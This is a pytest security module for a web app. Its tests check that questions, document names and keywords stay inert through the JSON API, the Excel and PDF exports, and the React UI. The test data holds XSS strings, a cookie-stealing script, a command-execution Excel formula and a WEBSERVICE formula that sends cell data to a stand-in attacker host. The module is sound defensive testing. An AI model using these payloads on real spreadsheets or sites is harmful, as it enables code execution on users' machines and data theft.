"""backend/tests/security/test_xss.py

Role: Prove that user-supplied text — questions, document names, keywords — cannot become
executable content anywhere it travels: the JSON API, the Excel export, the PDF export, or the
React UI.

`.claude/rules/secure-coding-vapt.md`: *"**XSS**: Apply context-aware output encoding for all
user-generated content (query text, document names, usernames) rendered in UI. Sanitize before
display."*

Where the encoding actually belongs
-----------------------------------
There is no server-rendered HTML in this project. The backend returns JSON and the frontend is
React, so "sanitize before display" is a chain of four links rather than one escaping call, and
each link is a separate test class here:

  1. **Storage keeps the text verbatim.** Escaping on the way *in* is the classic mistake: it
     writes `&lt;script&gt;` into the audit trail, and the question of record is then not the
     question that was asked. `_normalize_question` strips control characters and nothing else,
     which is what `TestPayloadsSurviveVerbatim` asserts.
  2. **The response is unambiguously data.** `application/json` plus `X-Content-Type-Options:
     nosniff`, so a browser handed `<script>` in a field cannot be talked into parsing the body
     as HTML. That is `TestTheApiOnlyEverEmitsJson`.
  3. **The UI renders it as a text node.** React escapes interpolated strings; the risk is an
     opt-out. `TestTheFrontendDoesNotOptOut` scans for one.
  4. **Defence in depth at the browser.** The CSP in `next.config.js`, asserted — including the
     one directive that is genuinely weaker than it looks.

Two places where text stops being text
--------------------------------------
An export is not a browser, and both export formats have their own injection grammar:

  * **Excel.** A cell beginning `=`, `+`, `-`, `@` or a tab is a formula, and
    `=cmd|'/c calc'!A1` in a spreadsheet a compliance officer opens is code execution on their
    machine. This is *not* XSS, but it is the same defect — user text reaching an interpreter —
    and the export is fed by the very fields this module is about.
  * **PDF.** `reportlab`'s `Paragraph` parses a mini-HTML dialect, so `<b>` in a document name
    is markup and an unbalanced `<` can raise mid-render and 500 the whole export.

Both are tested by rendering a real file and reading it back, not by inspecting the helper that
is supposed to have been called.
"""

from __future__ import annotations

import io
import pathlib
import re
import uuid
from collections.abc import Callable
from datetime import UTC, datetime

import httpx
import pytest

from backend.models.user import User
from backend.services.storage_service import sanitize_filename
from backend.tests.security.conftest import API, XSS_PAYLOADS, Stack, csrf_headers
from backend.utils.export_utils import (
    FORMULA_LEADERS,
    ReportDocument,
    ReportTable,
    render_excel,
    render_pdf,
)

Api = tuple[httpx.AsyncClient, Callable[[User | None], None]]

#: Repo root, from `backend/tests/security/test_xss.py`.
REPO_ROOT = pathlib.Path(__file__).resolve().parents[3]
FRONTEND = REPO_ROOT / "frontend"

#: Payloads that are also Excel formulas. Kept separate from `XSS_PAYLOADS` because the
#: interpreter is different — a spreadsheet does not care about `<script>`, and a browser does
#: not care about `=cmd`.
FORMULA_PAYLOADS: tuple[str, ...] = (
    "=cmd|'/c calc'!A1",
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(1:1)",
    "=HYPERLINK(\"http://attacker.invalid\",\"click\")",
    "\t=1+1",
    "=WEBSERVICE(\"http://attacker.invalid/leak?d=\"&A1)",
)


def _source_files() -> list[pathlib.Path]:
    """Every hand-written frontend source file. `node_modules` is excluded, deliberately.

    A dependency using `innerHTML` internally is not this project's opt-out — it is a supply
    chain question, and answering it by grepping 40,000 vendored files would produce a list
    nobody reads. What this module can assert is that *our* code never hands markup to the DOM.
    """
    if not FRONTEND.exists():  # pragma: no cover - the frontend is part of the repo
        return []
    return [
        path
        for pattern in ("**/*.ts", "**/*.tsx", "**/*.js", "**/*.jsx")
        for path in FRONTEND.glob(pattern)
        if "node_modules" not in path.parts and ".next" not in path.parts
    ]


class TestPayloadsSurviveVerbatim:
    """The text stored is the text typed. Escaping here would be the bug, not the fix."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    async def test_a_question_is_stored_and_returned_unchanged(
        self, stack: Stack, api: Api, payload: str
    ) -> None:
        """Byte-identical, both in the response and in the persisted row.

        A half-escaping — `&lt;` in the response, raw text in the database, or the reverse — is
        worse than either extreme: the UI shows something nobody typed, and `audit-log-
        immutability.md` means the mangled version is what a regulator reads back.
        """
        client, as_user = api
        as_user(stack.a.user)
        question = f"What is the fee for {payload}?"

        response = await client.post(
            f"{API}/queries", json={"question_text": question}, headers=csrf_headers()
        )

        assert response.status_code == 202, response.text
        body = response.json()
        assert body["question_text"] == question, (
            "the question was altered on the way in; the stored question of record is no "
            f"longer what was asked: {body['question_text']!r}"
        )
        stored = await stack.queries.get(uuid.UUID(body["id"]), stack.a.user.tenant_id)
        assert stored is not None and stored.question_text == question

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    async def test_the_payload_comes_back_through_history_unchanged(
        self, stack: Stack, api: Api, payload: str
    ) -> None:
        """The read path too, since history is a second serializer over the same row."""
        client, as_user = api
        as_user(stack.a.user)
        question = f"Explain {payload} in the fee schedule"
        submitted = await client.post(
            f"{API}/queries", json={"question_text": question}, headers=csrf_headers()
        )
        assert submitted.status_code == 202, submitted.text

        listed = await client.get(f"{API}/history")

        assert listed.status_code == 200, listed.text
        questions = [item["question_text"] for item in listed.json()["items"]]
        assert question in questions, f"history altered the question: {questions}"


class TestTheApiOnlyEverEmitsJson:
    """A payload in a field is harmless while the body is data. These headers are why."""

    async def test_a_response_carrying_a_payload_is_json_with_nosniff(
        self, stack: Stack, api: Api
    ) -> None:
        client, as_user = api
        as_user(stack.a.user)
        question = "What about <svg/onload=alert(1)> in the fee schedule?"
        await client.post(
            f"{API}/queries", json={"question_text": question}, headers=csrf_headers()
        )

        response = await client.get(f"{API}/history")

        assert response.status_code == 200
        assert question in response.text, "the payload is not in this body; nothing is proven"
        assert response.headers["content-type"].startswith("application/json")
        assert response.headers["x-content-type-options"] == "nosniff", (
            "without nosniff a browser may content-sniff this body as HTML, at which point "
            "the payload in the question field is live markup"
        )
        assert response.headers["x-frame-options"] == "DENY"

    @pytest.mark.parametrize(
        "path",
        [
            f"{API}/documents",
            f"{API}/history",
            f"{API}/audit",
            f"{API}/analytics/keywords",
            f"{API}/auth/me",
        ],
    )
    async def test_no_read_route_returns_html(self, stack: Stack, api: Api, path: str) -> None:
        client, as_user = api
        as_user(stack.a.admin)
        response = await client.get(path)
        assert "html" not in response.headers.get("content-type", ""), (
            f"{path} returned an HTML content type"
        )

    async def test_an_error_body_does_not_echo_the_payload(
        self, stack: Stack, api: Api
    ) -> None:
        """A 422 names the field that failed, never the value.

        A reflected value in an error body is the shortest path to XSS in an API: it takes one
        client that renders `error.message` into the DOM without escaping. The handler in
        `api/app.py` builds `fields` from `err["loc"]` only, and this asserts that holds.
        """
        client, as_user = api
        as_user(stack.a.user)
        payload = "<script>alert(document.cookie)</script>"

        response = await client.post(
            f"{API}/queries",
            json={"question_text": "ok", payload: payload},
            headers=csrf_headers(),
        )

        assert response.status_code == 422, response.text
        # The *field name* is echoed — that is how a client knows what to fix — so the check is
        # that the field's *value* is not, and that the message is fixed server-side text.
        assert response.json()["error"]["message"] == "The request was not valid."
        assert "alert(document.cookie)" not in response.json()["error"]["message"]


class TestDocumentNamesAreSanitized:
    """A filename is the one user string that becomes part of a storage path."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_sanitize_filename_leaves_no_markup_character(self, payload: str) -> None:
        """The allowlist is `[A-Za-z0-9._-]`, so every markup character is replaced.

        This is stricter than XSS needs and that is intentional: the same string reaches an S3
        key, a `Content-Disposition` header and the UI, and one allowlist is easier to reason
        about than three context-specific escapes.
        """
        cleaned = sanitize_filename(f"{payload}.pdf")

        for character in "<>\"'`/\\ ":
            assert character not in cleaned, (
                f"{character!r} survived sanitization of {payload!r}: {cleaned!r}"
            )
        assert "script" not in cleaned.lower() or "<" not in cleaned

    async def test_an_uploaded_name_is_stored_sanitized(
        self, stack: Stack, api: Api
    ) -> None:
        client, as_user = api
        as_user(stack.a.admin)
        before = set(stack.documents.documents)

        response = await client.post(
            f"{API}/documents",
            files={
                "file": (
                    "<img src=x onerror=alert(1)>.pdf",
                    b"%PDF-1.4\n%%EOF\n",
                    "application/pdf",
                )
            },
            headers=csrf_headers(),
        )

        assert response.status_code == 201, response.text
        created = [doc for key, doc in stack.documents.documents.items() if key not in before]
        assert len(created) == 1
        assert "<" not in created[0].name and ">" not in created[0].name, (
            f"the stored document name carries markup: {created[0].name!r}"
        )
        assert "<" not in response.text, "the upload response echoed markup"


class TestExcelExportCannotEvaluate:
    """Rendered, then read back with openpyxl. Not a check that a helper was called."""

    @pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
    def test_a_formula_payload_is_written_as_text(self, payload: str) -> None:
        from openpyxl import load_workbook

        report = ReportDocument(
            title="Keyword trends",
            generated_at=datetime(2026, 8, 14, tzinfo=UTC),
            subtitle="tenant A, all history",
            tables=(
                ReportTable(
                    title="Most searched",
                    columns=("keyword", "queries"),
                    rows=((payload, 3),),
                ),
            ),
        )

        workbook = load_workbook(io.BytesIO(render_excel(report)))
        sheet = workbook.active
        cell = next(
            c
            for row in sheet.iter_rows()
            for c in row
            if isinstance(c.value, str) and payload.strip() in c.value
        )

        assert cell.data_type == "s", (
            f"{payload!r} was written with data_type {cell.data_type!r}; Excel will evaluate "
            "anything that is not a string element"
        )
        if cell.value.startswith(FORMULA_LEADERS):
            assert cell.quotePrefix is True, (
                f"{payload!r} leads with a formula character and carries no quote prefix, so "
                "editing the cell in Excel re-activates it as a formula"
            )

    def test_the_payload_is_still_readable_to_a_human(self) -> None:
        """Inert is not the same as destroyed.

        An export is evidence. If the renderer stripped the `=` to make the cell safe, the
        keyword a user actually searched for would be missing from the compliance report — a
        different defect with the same green test.
        """
        from openpyxl import load_workbook

        payload = "=cmd|'/c calc'!A1"
        report = ReportDocument(
            title="Keyword trends",
            generated_at=datetime(2026, 8, 14, tzinfo=UTC),
            subtitle="all history",
            tables=(
                ReportTable(title="Most searched", columns=("keyword",), rows=((payload,),)),
            ),
        )

        workbook = load_workbook(io.BytesIO(render_excel(report)))
        values = [c.value for row in workbook.active.iter_rows() for c in row]
        assert payload in values, f"the payload was altered instead of neutralized: {values}"


class TestPdfExportCannotInjectMarkup:
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_markup_in_a_cell_does_not_break_the_render(self, payload: str) -> None:
        """An unbalanced tag must not raise. A 500 on export is a denial of service.

        `<scr<script>ipt>` in `XSS_PAYLOADS` is the one that matters: it is deliberately
        malformed, and `reportlab`'s paragraph parser raises on malformed markup rather than
        rendering it wrong.
        """
        report = ReportDocument(
            title="Document usage",
            generated_at=datetime(2026, 8, 14, tzinfo=UTC),
            subtitle="all history",
            tables=(
                ReportTable(
                    title="Cited documents",
                    columns=("document", "citations"),
                    rows=((f"{payload}.pdf", 2),),
                ),
            ),
        )

        pdf = render_pdf(report)

        assert pdf.startswith(b"%PDF-"), "the export is not a PDF"
        assert len(pdf) > 1000, f"a {len(pdf)}-byte PDF is not a rendered report"

    def test_the_pdf_escape_is_applied_to_text(self) -> None:
        from backend.utils.export_utils import _pdf_text

        assert _pdf_text("<b>bold</b>") == "&lt;b&gt;bold&lt;/b&gt;"
        assert _pdf_text("a & b") == "a &amp; b"
        # Quotes are deliberately not escaped — see `_pdf_text`. They are legal in the dialect
        # and escaping them would put `&quot;` in front of a compliance officer.
        assert _pdf_text('say "hi"') == 'say "hi"'


class TestTheFrontendDoesNotOptOut:
    """React escapes by default. These tests look for the places that turn that off."""

    def test_the_scan_found_source_files(self) -> None:
        files = _source_files()
        assert len(files) >= 20, (
            f"only found {len(files)} frontend source files, so the scans below prove nothing"
        )

    @pytest.mark.parametrize(
        ("name", "pattern"),
        [
            # `[=:]` rather than the bare name, so a comment saying "nothing reaches
            # dangerouslySetInnerHTML" is not a finding. Two such comments exist.
            ("dangerouslySetInnerHTML", r"dangerouslySetInnerHTML\s*[=:]"),
            ("innerHTML assignment", r"\.innerHTML\s*="),
            ("outerHTML assignment", r"\.outerHTML\s*="),
            ("document.write", r"document\s*\.\s*write\s*\("),
            ("eval", r"(?<![\w.])eval\s*\("),
            ("new Function", r"new\s+Function\s*\("),
            ("insertAdjacentHTML", r"insertAdjacentHTML\s*\("),
            # `javascript:` in an href is XSS that React's escaping does not stop, because the
            # value is an attribute rather than a text node.
            ("javascript: URL", r"""href\s*=\s*\{?['"`]?\s*javascript:"""),
        ],
    )
    def test_no_source_file_uses_it(self, name: str, pattern: str) -> None:
        compiled = re.compile(pattern)
        offenders = [
            f"{path.relative_to(REPO_ROOT)}:{number}"
            for path in _source_files()
            for number, line in enumerate(
                path.read_text(encoding="utf-8", errors="replace").splitlines(), start=1
            )
            if compiled.search(line)
        ]
        assert offenders == [], f"{name} is used in frontend source: {offenders}"


class TestTheContentSecurityPolicy:
    """The last line of defence, and the one place this project's posture is honestly weak."""

    def test_the_frontend_sets_a_policy(self) -> None:
        config = (FRONTEND / "next.config.js").read_text(encoding="utf-8")
        for directive in (
            "default-src 'self'",
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "frame-ancestors 'none'",
        ):
            assert directive in config, f"the CSP is missing {directive}"

    def test_the_script_src_weakening_is_recorded_not_hidden(self) -> None:
        """`script-src 'unsafe-inline'` is present, and this test says so out loud.

        Next.js injects inline bootstrap scripts, so `'self'` alone breaks the app. The cost is
        real: with `'unsafe-inline'`, CSP stops loading an external script but not executing an
        injected inline one, so the CSP is a second layer against *some* of XSS rather than all
        of it. React's escaping and the `dangerouslySetInnerHTML` scan above are the primary
        control; this is not.

        Closing it means per-request nonces, which needs middleware and a decision about
        Tailwind's inline styles — an architecture change, not a config tweak
        (`.claude/rules/workflow.md`: ask first). The test asserts the *current* state so the
        gap is visible in the suite; if someone adopts nonces, this test fails and gets
        deleted, which is the right way for it to end.
        """
        config = (FRONTEND / "next.config.js").read_text(encoding="utf-8")
        assert "'unsafe-inline'" in config, (
            "the CSP no longer allows inline scripts — if nonces were adopted, delete this "
            "test and the note in docs/RELEASE.md that references it"
        )

    def test_unsafe_eval_is_development_only(self) -> None:
        """`'unsafe-eval'` may reach a developer's browser. It may not reach production.

        React's development build calls `eval()` to rebuild component stacks, and a policy
        without the directive replaces those stack traces with a console error. The dev server,
        the source tree and the toolchain are already on that machine, so the exemption costs
        nothing there. In production it would cost the one thing CSP still buys with
        `'unsafe-inline'` present: an injected string cannot become code.

        This asserts the *gate*, not the absence — every executable occurrence has to sit on a
        line that also names `isProduction`. Comment lines are excluded because the reasoning
        above is written into that file too, and prose is not policy.
        """
        config = (FRONTEND / "next.config.js").read_text(encoding="utf-8")
        assert "const isProduction = process.env.NODE_ENV === 'production'" in config, (
            "next.config.js no longer derives `isProduction`, so the dev-only CSP relaxation "
            "cannot be gated on it"
        )
        ungated = [
            line.strip()
            for line in config.splitlines()
            if "unsafe-eval" in line
            and not line.strip().startswith(("*", "//", "/*"))
            and "isProduction" not in line
        ]
        assert ungated == [], (
            "'unsafe-eval' appears in the CSP without a production gate: "
            f"{ungated}. It is a materially weaker posture than 'unsafe-inline' — an injected "
            "string becomes code — and shipping it needs its own decision."
        )

    def test_the_websocket_allowance_is_development_only(self) -> None:
        """`connect-src ws:` exists for hot reload. It has no business in production.

        `next dev` hot-reloads over a WebSocket to `ws://<host>/_next/hmr`, and WebSocket URLs
        are matched by `connect-src`. CSP3 says `'self'` should cover a same-host `ws:` URL for
        an `http:` document, but that was a late spec addition and is not uniformly honoured —
        so the scheme is named explicitly rather than assumed.

        `next start` serves a built app and opens no such socket, so in production the
        directive would enable nothing and only widen where a page may talk to. Gated for the
        same reason `'unsafe-eval'` is, and asserted the same way: by the *gate*, not the
        absence, with comment lines excluded because the reasoning is written into that file.
        """
        config = (FRONTEND / "next.config.js").read_text(encoding="utf-8")
        ungated = [
            line.strip()
            for line in config.splitlines()
            if "ws:" in line
            and not line.strip().startswith(("*", "//", "/*"))
            and "isProduction" not in line
        ]
        assert ungated == [], (
            f"a ws: allowance appears in the CSP without a production gate: {ungated}. Hot "
            "reload needs it; a built app does not."
        )

    def test_the_api_does_not_pretend_to_serve_html(self, stack: Stack, api: Api) -> None:
        """The backend sets no CSP, and that is defensible rather than an omission.

        A CSP governs how a browser treats a *document*. This API returns JSON and `nosniff`
        stops it being treated as a document. The headers that do travel with every response
        are asserted in `TestTheApiOnlyEverEmitsJson`.

        The one HTML surface is `/docs`, and it is no longer local-only: `ENABLE_API_DOCS`
        can mount it on a deployed instance (see `backend/tests/test_api_docs_gate.py` for
        why that setting was split out of `ENVIRONMENT`). Swagger UI is FastAPI's own page
        loading its assets from a CDN, so a CSP here would have to allow that CDN to be
        useful — which is why enabling the docs on an internet-facing origin is a decision
        rather than a default, and why `ENABLE_API_DOCS` is documented as one.
        """
        from backend.api.app import SECURITY_HEADERS

        assert "Content-Security-Policy" not in SECURITY_HEADERS
        assert SECURITY_HEADERS["X-Content-Type-Options"] == "nosniff"
        assert SECURITY_HEADERS["X-Frame-Options"] == "DENY"
